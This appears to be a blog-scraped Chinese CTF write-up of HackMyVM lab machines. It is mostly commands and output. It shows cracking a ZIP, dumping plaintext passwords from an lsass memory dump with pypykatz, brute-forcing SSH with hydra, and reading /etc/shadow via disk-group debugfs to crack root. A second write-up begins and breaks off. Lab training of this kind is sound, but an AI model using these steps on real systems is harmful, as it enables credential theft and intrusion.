1\n\n\nBreak signaled\n```\n\n\u7206\u7834\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ zip2john old_files.zip > hash                       \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])\nNo password hashes left to crack (see FAQ)\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --show hash                                    \n\nold_files.zip/lsass.DMP:medusa666:lsass.DMP:old_files.zip:old_files.zip\n\n1 password hash cracked, 0 left\n                            \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ 7z x old_files.zip\n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024\n\nScanning the drive for archives:\n1 file, 12387024 bytes (12 MiB)\n\nExtracting archive: old_files.zip\n--\nPath = old_files.zip\nType = zip\nPhysical Size = 12387024\n\n  \nWould you like to replace the existing file:\n  Path:     ./lsass.DMP\n  Size:     0 bytes\n  Modified: 2023-01-17 22:12:41\nwith the file from archive:\n  Path:     lsass.DMP\n  Size:     34804383 bytes (34 MiB)\n  Modified: 2023-01-17 22:12:41\n? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y      \n\n              \nEnter password (will not be echoed):\nEverything is Ok\n\nSize:       34804383\nCompressed: 12387024\n                                         \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ file lsass.DMP\nlsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type\n```\n\n\u53c2\u8003\u94fe\u63a5\uff1ahttps://technicalnavigator.in/how-to-extract-information-from-dmp-files/\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ pypykatz lsa minidump lsass.DMP                \nINFO:pypykatz:Parsing file lsass.DMP\nFILE: ======== lsass.DMP =======\n== LogonSession ==\nauthentication_id 2261421 (2281ad)\nsession_id 18\nusername avijneyam\ndomainname Medusa-PC\nlogon_server MEDUSA-PC\nlogon_time 2023-01-17T14:05:20.008398+00:00\nsid S-1-5-21-1556941724-2101079873-2087351601-1016\nluid 2261421\n\n\u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \u7701\u7565 \n\n\n                   \n```\n\n\u63d0\u53d6\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ pypykatz lsa minidump lsass.DMP | grep 'username'\n\nINFO:pypykatz:Parsing file lsass.DMP\nusername avijneyam\n                username avijneyam\n                username avijneyam\n                username avijneyam\nusername shelldredd\n                username shelldredd\n                username shelldredd\n                username shelldredd\nusername powerful\n                username powerful\n                username powerful\n                username powerful\nusername alienum\n                username alienum\n                username alienum\n                username alienum\nusername Claor\n                username Claor\n                username Claor\n                username Claor\nusername Pr0xy\n                username Pr0xy\n                username Pr0xy\n                username Pr0xy\nusername nolo\n                username nolo\n                username nolo\n                username nolo\nusername numero6\n                username numero6\n                username numero6\n                username numero6\nusername ct0l4\n                username ct0l4\n                username ct0l4\n                username ct0l4\nusername LordP4\n                username LordP4\n                username LordP4\n                username LordP4\nusername sml\n                username sml\n                username sml\n                username sml\nusername spectre\n                username spectre\n                username spectre\n                username spectre\nusername RiJaba1\n                username RiJaba1\n                username RiJaba1\n                username RiJaba1\nusername jabatron\n                username jabatron\n                username jabatron\n                username jabatron\nusername InfayerTS\n                username InfayerTS\n                username InfayerTS\n                username InfayerTS\nusername d4t4s3c\n                username d4t4s3c\n                username d4t4s3c\n                username d4t4s3c\nusername cromiphi\n                username cromiphi\n                username cromiphi\n                username cromiphi\nusername Medusa\n                username Medusa\n                username Medusa\n                username Medusa\nusername Medusa\n                username Medusa\n                username Medusa\n                username Medusa\nusername ANONYMOUS LOGON\nusername SERVICIO LOCAL\nusername MEDUSA-PC$\n                username MEDUSA-PC$\n                username MEDUSA-PC$\nusername \nusername MEDUSA-PC$\n                username MEDUSA-PC$\n                username MEDUSA-PC$\n                                                                                        \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ pypykatz lsa minidump lsass.DMP | grep 'username'|awk -F ' ' '{print $2}'|sort | uniq\nINFO:pypykatz:Parsing file lsass.DMP\n\nalienum\nANONYMOUS\navijneyam\nClaor\ncromiphi\nct0l4\nd4t4s3c\nInfayerTS\njabatron\nLordP4\nMedusa\nMEDUSA-PC$\nnolo\nnumero6\npowerful\nPr0xy\nRiJaba1\nSERVICIO\nshelldredd\nsml\nspectre\n               \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ pypykatz lsa minidump lsass.DMP | grep 'password' \nINFO:pypykatz:Parsing file lsass.DMP\n                password 4v1jn3y4m_zxc\n                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000\n                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000\n                password 4v1jn3y4m_zxc\n                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000\n                password 4v1jn3y4m_zxc\n                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000\n                password t0p_s3cr3t\n                password (hex)7400300070005f0073003300630072003300740000000000\n                password (hex)7400300070005f0073003300630072003300740000000000\n                password t0p_s3cr3t\n                password (hex)7400300070005f0073003300630072003300740000000000\n                password t0p_s3cr3t\n                password (hex)7400300070005f0073003300630072003300740000000000\n                password p0w3rf1ll_abc\n                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000\n                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000\n                password p0w3rf1ll_abc\n                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000\n                password p0w3rf1ll_abc\n                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000\n                password 4l13num_qwerty\n                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000\n                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000\n                password 4l13num_qwerty\n                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000\n                password 4l13num_qwerty\n                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000\n                password n0s_v0lv1m0s_4_1lusi0n4r\n                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200\n                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200\n                password n0s_v0lv1m0s_4_1lusi0n4r\n                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200\n                password n0s_v0lv1m0s_4_1lusi0n4r\n                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200\n                password pr0xy_ch41ns_456\n                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600\n                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600\n                password pr0xy_ch41ns_456\n                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600\n                password pr0xy_ch41ns_456\n                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600\n                password littl3_h4ck3r\n                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000\n                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000\n                password littl3_h4ck3r\n                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000\n                password littl3_h4ck3r\n                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000\n                password n1mb3r_s1x\n                password (hex)6e0031006d006200330072005f0073003100780000000000\n                password (hex)6e0031006d006200330072005f0073003100780000000000\n                password n1mb3r_s1x\n                password (hex)6e0031006d006200330072005f0073003100780000000000\n                password n1mb3r_s1x\n                password (hex)6e0031006d006200330072005f0073003100780000000000\n                password b4ck3nd_pr0gr4m3r\n                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000\n                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000\n                password b4ck3nd_pr0gr4m3r\n                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000\n                password b4ck3nd_pr0gr4m3r\n                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000\n                password Wh1t3_h4ck\n                password (hex)570068003100740033005f006800340063006b0000000000\n                password (hex)570068003100740033005f006800340063006b0000000000\n                password Wh1t3_h4ck\n                password (hex)570068003100740033005f006800340063006b0000000000\n                password Wh1t3_h4ck\n                password (hex)570068003100740033005f006800340063006b0000000000\n                password th3_b0ss\n                password (hex)7400680033005f006200300073007300\n                password (hex)7400680033005f006200300073007300\n                password th3_b0ss\n                password (hex)7400680033005f006200300073007300\n                password th3_b0ss\n                password (hex)7400680033005f006200300073007300\n                password 5p3ctr3_p0is0n_xX\n                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000\n                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000\n                password 5p3ctr3_p0is0n_xX\n                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000\n                password 5p3ctr3_p0is0n_xX\n                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000\n                password littl3_h4ck3r_v2\n                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200\n                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200\n                password littl3_h4ck3r_v2\n                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200\n                password littl3_h4ck3r_v2\n                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200\n                password b1zum_3_AM\n                password (hex)620031007a0075006d005f0033005f0041004d0000000000\n                password (hex)620031007a0075006d005f0033005f0041004d0000000000\n                password b1zum_3_AM\n                password (hex)620031007a0075006d005f0033005f0041004d0000000000\n                password b1zum_3_AM\n                password (hex)620031007a0075006d005f0033005f0041004d0000000000\n                password UnD3sc0n0c1d0\n                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000\n                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000\n                password UnD3sc0n0c1d0\n                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000\n                password UnD3sc0n0c1d0\n                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000\n                password br4in_br34k3r\n                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000\n                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000\n                password br4in_br34k3r\n                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000\n                password br4in_br34k3r\n                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000\n                password br4in_br34k3r_v2\n                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200\n                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200\n                password br4in_br34k3r_v2\n                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200\n                password br4in_br34k3r_v2\n                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200\n                password 123456\n                password (hex)31003200330034003500360000000000\n                password (hex)31003200330034003500360000000000\n                password 123456\n                password (hex)31003200330034003500360000000000\n                password 123456\n                password (hex)31003200330034003500360000000000\n                password 123456\n                password (hex)31003200330034003500360000000000\n                password (hex)31003200330034003500360000000000\n                password 123456\n                password (hex)31003200330034003500360000000000\n                password 123456\n                password (hex)31003200330034003500360000000000\n                password None\n                password (hex)\n                password None\n                password (hex)\n                password None\n                password (hex)\n                password None\n                password (hex)\n                                                               \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ pypykatz lsa minidump lsass.DMP | grep 'password'|awk '!/hex/'|awk -F ' ' '{print $2}'| sort | uniq\nINFO:pypykatz:Parsing file lsass.DMP\n123456\n4l13num_qwerty\n4v1jn3y4m_zxc\n5p3ctr3_p0is0n_xX\nb1zum_3_AM\nb4ck3nd_pr0gr4m3r\nbr4in_br34k3r\nbr4in_br34k3r_v2\nlittl3_h4ck3r\nlittl3_h4ck3r_v2\nn0s_v0lv1m0s_4_1lusi0n4r\nn1mb3r_s1x\nNone\np0w3rf1ll_abc\npr0xy_ch41ns_456\nt0p_s3cr3t\nth3_b0ss\nUnD3sc0n0c1d0\nWh1t3_h4ck\n```\n\n\u6c47\u603b\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat user\nalienum\nANONYMOUS\navijneyam\nClaor\ncromiphi\nct0l4\nd4t4s3c\nInfayerTS\njabatron\nLordP4\nMedusa\nMEDUSA-PC$\nnolo\nnumero6\npowerful\nPr0xy\nRiJaba1\nSERVICIO\nshelldredd\nsml\nspectre\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat pass  \n123456\n4l13num_qwerty\n4v1jn3y4m_zxc\n5p3ctr3_p0is0n_xX\nb1zum_3_AM\nb4ck3nd_pr0gr4m3r\nbr4in_br34k3r\nbr4in_br34k3r_v2\nlittl3_h4ck3r\nlittl3_h4ck3r_v2\nn0s_v0lv1m0s_4_1lusi0n4r\nn1mb3r_s1x\nNone\np0w3rf1ll_abc\npr0xy_ch41ns_456\nt0p_s3cr3t\nth3_b0ss\nUnD3sc0n0c1d0\nWh1t3_h4ck\n          \n```\n\n\u4f46\u662f\u6211\u4eec\u7528\u6237\u521a\u521a\u770b\u53ea\u6709spectre\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u5c1d\u8bd5\u7206\u7834spectre\u5148\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -l spectre -P pass ssh://192.168.205.145 -V -I -u -f -e nsr -t 64\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-04 18:33:19\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 22 tasks per 1 server, overall 22 tasks, 22 login tries (l:1/p:22), ~1 try per task\n[DATA] attacking ssh://192.168.205.145:22/\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'spectre' - 1 of 22 [child 0] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '' - 2 of 22 [child 1] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'ertceps' - 3 of 22 [child 2] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '123456' - 4 of 22 [child 3] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '4l13num_qwerty' - 5 of 22 [child 4] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '4v1jn3y4m_zxc' - 6 of 22 [child 5] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '5p3ctr3_p0is0n_xX' - 7 of 22 [child 6] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'b1zum_3_AM' - 8 of 22 [child 7] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'b4ck3nd_pr0gr4m3r' - 9 of 22 [child 8] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r' - 10 of 22 [child 9] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r_v2' - 11 of 22 [child 10] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'littl3_h4ck3r' - 12 of 22 [child 11] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'littl3_h4ck3r_v2' - 13 of 22 [child 12] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'n0s_v0lv1m0s_4_1lusi0n4r' - 14 of 22 [child 13] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'n1mb3r_s1x' - 15 of 22 [child 14] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'None' - 16 of 22 [child 15] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'p0w3rf1ll_abc' - 17 of 22 [child 16] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'pr0xy_ch41ns_456' - 18 of 22 [child 17] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 't0p_s3cr3t' - 19 of 22 [child 18] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'th3_b0ss' - 20 of 22 [child 19] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'UnD3sc0n0c1d0' - 21 of 22 [child 20] (0/0)\n[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'Wh1t3_h4ck' - 22 of 22 [child 21] (0/0)\n[REDO-ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r_v2' - 23 of 27 [child 1] (1/5)\n[22][ssh] host: 192.168.205.145   login: spectre   password: 5p3ctr3_p0is0n_xX\n[STATUS] attack finished for 192.168.205.145 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-04 18:33:20\n```\n\n\u767b\u5f55\n\n```\nwww-data@medusa:/...$ ls /home/\nspectre\nwww-data@medusa:/...$ su - spectre\nPassword: \nspectre@medusa:~$ id\nuid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)\n```\n\ndisk\u6211\u8bb0\u5f97\u597d\u50cf\u53ef\u4ee5\u63d0\u6743\n\nhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group\n\n```\n#\u67e5\u770b\u7cfb\u7edf\u5206\u533a\u548c\u6587\u4ef6\u7cfb\u7edf\u4fe1\u606f\ndf -h\n#\u4f7f\u7528debugfs\u67e5\u770b\u6587\u4ef6\ndebugfs /dev/sda1\ndebugfs: cat /root/.ssh/id_rsa\nspectre@medusa:~$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda1       6.9G  2.1G  4.5G  32% /\nudev            471M     0  471M   0% /dev\ntmpfs           489M     0  489M   0% /dev/shm\ntmpfs            98M  504K   98M   1% /run\ntmpfs           5.0M     0  5.0M   0% /run/lock\ntmpfs            98M     0   98M   0% /run/user/1000\nspectre@medusa:~$ debugfs /dev/sda1\n-bash: debugfs: command not found\nspectre@medusa:~$ which debugfs\nspectre@medusa:~$ find / -name debugfs 2>/dev/null\n/usr/sbin/debugfs\nspectre@medusa:~$ /usr/sbin/debugfs /dev/sda1\ndebugfs 1.46.2 (28-Feb-2021)\ndebugfs:  cat /root/.ssh/id_rsa\n/root/.ssh/id_rsa: File not found by ext2_lookup \ndebugfs:  cat /etc/shadow\nroot:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::\ndaemon:*:19372:0:99999:7:::\nbin:*:19372:0:99999:7:::\nsys:*:19372:0:99999:7:::\nsync:*:19372:0:99999:7:::\ngames:*:19372:0:99999:7:::\nman:*:19372:0:99999:7:::\nlp:*:19372:0:99999:7:::\nmail:*:19372:0:99999:7:::\nnews:*:19372:0:99999:7:::\nuucp:*:19372:0:99999:7:::\nproxy:*:19372:0:99999:7:::\nwww-data:*:19372:0:99999:7:::\nbackup:*:19372:0:99999:7:::\nlist:*:19372:0:99999:7:::\nirc:*:19372:0:99999:7:::\ngnats:*:19372:0:99999:7:::\nnobody:*:19372:0:99999:7:::\n_apt:*:19372:0:99999:7:::\nsystemd-network:*:19372:0:99999:7:::\nsystemd-resolve:*:19372:0:99999:7:::\nmessagebus:*:19372:0:99999:7:::\nsystemd-timesync:*:19372:0:99999:7:::\nsshd:*:19372:0:99999:7:::\nspectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::\nsystemd-coredump:!*:19372::::::\nftp:*:19372:0:99999:7:::\n```\n\n\u62ff\u53bb\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ echo 'root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::' > hash\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nNo password hashes loaded (see FAQ)\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (crypt, generic crypt(3) [?/64])\nCost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes\nCost 2 (algorithm specific iterations) is 1 for all loaded hashes\nWill run 12 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nandromeda        (root)   \n1g 0:00:00:06 DONE (2025-02-04 18:39) 0.1455g/s 544.9p/s 544.9c/s 544.9C/s 19871987..street\nUse the '--show' option to display all of the cracked passwords reliably\nSession completed. \n                 \n```\n\n\u767b\u5f55\n\n```\ndebugfs:  exit\ndebugfs: Unknown request 'exit'.  Type '?' for a request list.\ndebugfs:  \ndebugfs:  quit\nspectre@medusa:~$ su -\nPassword: \nroot@medusa:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\n<!-- ##{'timestamp':1738666533}## -->sentence", "top": 0, "createdAt": 1738666533, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-04", "dateLabelColor": "#0969da"}, "P104": {"htmlDir": "docs/post/hmv_hannah.html", "labels": ["HackMyVM"], "postTitle": "hmv_hannah", "postUrl": "post/hmv_hannah.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/104", "commentNum": 0, "wordCount": 8572, "description": "# hmv_hannah\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Hannah  \n**\u96be\u5ea6**\uff1a\u7eff\u8272  \n**\u76ee\u6807 IP**\uff1a192.168.205.150  \n**\u672c\u673a IP**\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\n\u200b`nmap`\u200b\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n --min-rate 10000 192.168.205.150\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:07 CST\nNmap scan report for 192.168.205.150\nHost is up (0.00031s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)\n|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)\n|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)\n|_auth-owners: root\n80/tcp  open  http    nginx 1.18.0\n|_http-server-header: nginx/1.18.0\n| http-robots.txt: 1 disallowed entry \n|_/enlightenment\n|_http-title: Site doesn't have a title (text/html).\n|_auth-owners: moksha\n113/tcp open  ident?\n|_auth-owners: root\nMAC Address: 08:00:27:7C:E4:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.31 ms 192.168.205.150\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 79.58 seconds\n                                                   \n```\n\n113\u672a\u77e5\u7aef\u53e3\uff0c\u4f18\u5148\u67e5\u770b\n\n# 2.\u8e29\u70b9\n\nhttps://book.hacktricks.wiki/zh/network-services-pentesting/113-pentesting-ident.html#basic-information\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.150:113                                                                       \ncurl: (56) Recv failure: \u8fde\u63a5\u88ab\u5bf9\u65b9\u91cd\u7f6e\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc 192.168.205.150 113 \nhello \n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -vn 192.168.205.150 113\n(UNKNOWN) [192.168.205.150] 113 (auth) open\nhello\n                            \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ident-user-enum 192.168.205.150 80 22 113\nident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )\n\n192.168.205.150:80      moksha\n192.168.205.150:22      root\n192.168.205.150:113     root\n                               \n```\n\n\u6709\u4e00\u4e2amoksha\u7528\u6237\uff0c\u6211\u4eec\u5c1d\u8bd5\u7206\u7834ssh\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -l moksha -P /usr/share/wordlists/q5000.txt ssh://192.168.205.150 -V -I -u -f -e nsr -t 64\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:23:42\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task\n[DATA] attacking ssh://192.168.205.150:22/\n[22][ssh] host: 192.168.205.150   login: moksha   password: hannah\n[STATUS] attack finished for 192.168.205.150 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:23:44\n\n```\n\n\u6211\u7b2c\u4e00\u6b21\u7206\u7834\u7684\u65f6\u5019\u6ca1\u51fa\u6765\uff0c\u771f\u7684\u6709\u70b9\u65e0\u8bed\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh moksha@192.168.205.150    \nmoksha@192.168.205.150's password: \nLinux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Jan  4 10:45:54 2023 from 192.168.1.51\nmoksha@hannah:~$ id\nuid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)\n\n```\n\n# 3.\u63d0\u6743\n\n```\nmoksha@hannah:~$ sudo -l\n-bash: sudo: orden no encontrada\nmoksha@hannah:~$ which sudo\nmoksha@hannah:~$ find / -name sudo 2>/dev/null\n/usr/share/bash-completion/completions/sudo\nmoksha@hannah:~$ /usr/share/bash-completion/completions/sudo -l\n-bash: /usr/share/bash-completion/completions/sudo: Permiso denegado\nmoksha@hannah:~$ ls -la /usr/share/bash-completion/completions/sudo\n-rw-r--r-- 1 root root 1504 ago 12  2020 /usr/share/bash-completion/completions/sudo\n\n```\n\n\u6211\u8fd8\u4ee5\u4e3a\u53c8\u85cfsudo\u5462\n\n```\nmoksha@hannah:~$ ls -la\ntotal 32\ndrwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .\ndrwxr-xr-x 3 root   root   4096 ene  4  2023 ..\nlrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout\n-rw-r--r-- 1 